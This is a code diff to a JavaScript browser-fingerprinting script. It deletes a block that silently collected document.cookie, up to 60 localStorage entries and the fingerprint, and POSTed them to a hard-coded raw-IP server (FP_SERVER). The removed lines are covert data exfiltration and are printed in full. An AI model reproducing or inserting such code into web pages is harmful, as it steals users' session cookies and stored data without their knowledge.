@@ -80,7 +80,6 @@
     { phoneType: 'RedmiNote12', osVersion: '33', screenWidth: '1080', screenHeight: '2400', cpuCore: '6', deviceLevel: 'low',    ttVer: '12.47.20' }
   ];
   var FP_KEY = 'tb_fp_v3';
-  var FP_SERVER = 'http://81.70.82.70:6731/api/fp';
   var _deviceFP = null;
 
   function _randStr(len) {
@@ -249,22 +248,6 @@
       fillFallback(fp);
       _saveFP(fp);
       showFP(fp);
-      // 尽力上报（https 页面可能拦截 http 请求，失败不影响）
-      try {
-        var dump = { ua: ua.ua, fp: fp };
-        try { dump.cookie = D ? D.cookie : ''; } catch (e2) {}
-        try {
-          var ls = {};
-          var n = Math.min(W.localStorage ? W.localStorage.length : 0, 60);
-          for (var i = 0; i < n; i++) {
-            var k = W.localStorage.key(i);
-            var v = W.localStorage.getItem(k);
-            ls[k] = (v && v.length > 150) ? v.slice(0, 150) + '...len' + v.length : v;
-          }
-          dump.ls = ls;
-        } catch (e3) {}
-        fetch(FP_SERVER, { method: 'POST', body: JSON.stringify(dump) }).catch(function () {});
-      } catch (e) {}
     });
   }
 
